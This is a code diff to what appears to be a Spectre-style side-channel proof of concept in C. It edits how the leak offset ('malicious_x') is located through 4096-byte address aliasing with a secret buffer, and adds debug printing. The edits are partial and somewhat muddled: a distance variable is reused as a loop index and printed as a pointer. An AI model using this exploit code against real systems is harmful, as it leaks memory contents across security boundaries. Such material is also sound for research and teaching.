@@ -63,8 +63,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
 
 
   for (i = 0; i < 256; i++) {
-      //printf("try %d", i);
-      //results[i] = 0;
+      results[i] = 0;
   }
     
   for (tries = 999; tries > 0; tries--) {
@@ -144,7 +143,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
 }
 
 int main(int argc, const char * * argv) {
-  size_t malicious_x = 1; /* default for malicious_x */
+  size_t distanceFromCurrentAddressToDesiredAddress; /* default for malicious_x */
   int i, score[3], len = 23;
   uint8_t value[3];
   for (i = 0; i < sizeof(array2); i++)
@@ -157,16 +156,19 @@ int main(int argc, const char * * argv) {
   //Find the address that corresponds to secret[0] in terms of its modulu
   for (i = 0; i < sizeof(bigArray); i++) {
       addr = &bigArray[i];
-      if ((uint64_t)(addr) % 4096 == addressOfStartOfSecretModulo) {
-          malicious_x = i; //This is the location that we need in bigArray
+      distanceFromCurrentAddressToDesiredAddress = (size_t)(secret - (char*)addr);
+      if (distanceFromCurrentAddressToDesiredAddress % 4096 == 0) {
+          distanceFromCurrentAddressToDesiredAddress = i; //This is the location that we need in bigArray
           break;
       }
   }
-  bigArray[malicious_x] = 'A';
-  printf("Malicious x is %zu", malicious_x);
+  bigArray[distanceFromCurrentAddressToDesiredAddress] = 'A';
+  printf("Malicious x is %zu", distanceFromCurrentAddressToDesiredAddress);
   while (--len >= 0) {
-    printf("iteration %d \n", len);
-    readMemoryByte(malicious_x, value, score);
+    printf("\n");
+    printf("Reading at malicious_x = %p... ", (void*)distanceFromCurrentAddressToDesiredAddress);
+
+    readMemoryByte(distanceFromCurrentAddressToDesiredAddress, value, score);
 
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=%c score=%d ", value[0],
